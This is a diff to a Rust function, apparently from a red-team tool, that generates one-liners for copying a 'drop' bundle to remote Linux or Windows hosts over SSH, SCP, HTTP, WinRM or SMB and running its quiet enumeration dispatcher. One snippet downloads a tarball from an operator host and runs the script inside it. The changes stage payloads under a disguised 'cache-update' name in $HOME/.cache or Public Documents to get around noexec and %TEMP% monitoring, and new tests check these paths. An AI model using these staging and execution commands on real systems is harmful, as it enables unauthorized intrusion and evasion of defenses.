@@ -385,19 +385,28 @@ fn collect_files_recursive(root: &Path, files: &mut Vec<PathBuf>) -> Result<()> 
 
 pub fn one_liners(os: &str, transport: &str) -> String {
     match (os, transport) {
-        ("linux", "ssh") | ("linux", "scp") => r#"# SCP approved bundle + dispatcher
-scp -r ./drop user@host:/tmp/cache-update
-ssh user@host 'bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum'
+        ("linux", "ssh") | ("linux", "scp") => r#"# SCP approved bundle + dispatcher (replace host/path per ROE; avoid /tmp when noexec)
+ssh user@host 'mkdir -p "$HOME/.cache/cache-update"'
+scp -r ./drop/. user@host:.cache/cache-update/
+ssh user@host 'bash "$HOME/.cache/cache-update/scripts/run.sh" --authorized --profile quiet enum'
 "#.into(),
-        ("linux", "http") => r#"# HTTP pull of an approved bundle
-curl -fsSL http://OPERATOR:8000/drop.tar.gz | tar -xz -C /tmp/cache-update
-bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
+        ("linux", "http") => r#"# HTTP pull of an approved bundle (operator-hosted; not GitHub)
+mkdir -p "$HOME/.cache/cache-update"
+curl -fsSL http://OPERATOR:8000/drop.tar.gz | tar -xz -C "$HOME/.cache/cache-update"
+bash "$HOME/.cache/cache-update/scripts/run.sh" --authorized --profile quiet enum
 "#.into(),
-        ("windows", "winrm") => r#"# WinRM copy + policy-bound dispatcher
-Copy-Item -Recurse .\drop \\HOST\C$\Users\Public\Documents\cache-update
-Invoke-Command -ComputerName HOST -ScriptBlock {
-  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
-}
+        ("windows", "ssh") | ("windows", "scp") => r#"# OpenSSH SCP of approved bundle + dispatcher (keep the PE out of %TEMP%)
+ssh user@host "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path 'C:\Users\Public\Documents\cache-update' | Out-Null\""
+scp -r ./drop/. user@host:C:/Users/Public/Documents/cache-update/
+ssh user@host "powershell -NoProfile -File C:\Users\Public\Documents\cache-update\scripts\run.ps1 --authorized --profile quiet enum"
+"#.into(),
+        ("windows", "winrm") => r#"# WinRM session copy + policy-bound dispatcher (no C$ required)
+$RemoteDir = 'C:\Users\Public\Documents\cache-update'
+$s = New-PSSession -ComputerName HOST -Credential (Get-Credential)
+Invoke-Command -Session $s -ScriptBlock { param($Dir) New-Item -ItemType Directory -Force -Path $Dir | Out-Null } -ArgumentList $RemoteDir
+Copy-Item -ToSession $s -Path .\drop\* -Destination $RemoteDir -Recurse -Force
+Invoke-Command -Session $s -ScriptBlock { param($Dir) & (Join-Path $Dir 'scripts\run.ps1') --authorized --profile quiet enum } -ArgumentList $RemoteDir
+Remove-PSSession $s
 "#.into(),
         ("windows", "smb") => r#"# SMB approved bundle + dispatcher
 $Dir = '\\HOST\C$\Users\Public\Documents\cache-update'
@@ -415,12 +424,12 @@ Expand-Archive -Force (Join-Path $Dir 'drop.zip') $Dir
 & (Join-Path $Dir 'scripts\run.ps1') --authorized --profile quiet enum
 "#.into(),
         ("linux", "smb") => r#"# Copy from mounted engagement share
-mkdir -p /tmp/cache-update
-cp -R /mnt/engagement-share/drop/. /tmp/cache-update/
-bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
+mkdir -p "$HOME/.cache/cache-update"
+cp -R /mnt/engagement-share/drop/. "$HOME/.cache/cache-update/"
+bash "$HOME/.cache/cache-update/scripts/run.sh" --authorized --profile quiet enum
 "#.into(),
         _ => format!(
-            "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(winrm|smb|http)\n"
+            "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(ssh|scp|winrm|smb|http)\n"
         ),
     }
 }
@@ -508,12 +517,30 @@ mod tests {
     }
 
     #[test]
+    fn linux_ssh_one_liner_avoids_tmp_drop() {
+        let snippet = one_liners("linux", "ssh");
+        assert!(snippet.contains("$HOME/.cache/cache-update"));
+        assert!(!snippet.contains("/tmp/cache-update"));
+        assert!(snippet.contains("authorized"));
+    }
+
+    #[test]
+    fn windows_winrm_one_liner_uses_session_copy() {
+        let snippet = one_liners("windows", "winrm");
+        assert!(snippet.contains("Copy-Item -ToSession"));
+        assert!(snippet.contains("New-PSSession"));
+        assert!(snippet.contains("authorized"));
+    }
+
+    #[test]
     fn one_liners_cover_every_supported_transport() {
         for (os, transport) in [
             ("linux", "ssh"),
             ("linux", "scp"),
             ("linux", "http"),
             ("linux", "smb"),
+            ("windows", "ssh"),
+            ("windows", "scp"),
             ("windows", "winrm"),
             ("windows", "smb"),
             ("windows", "http"),
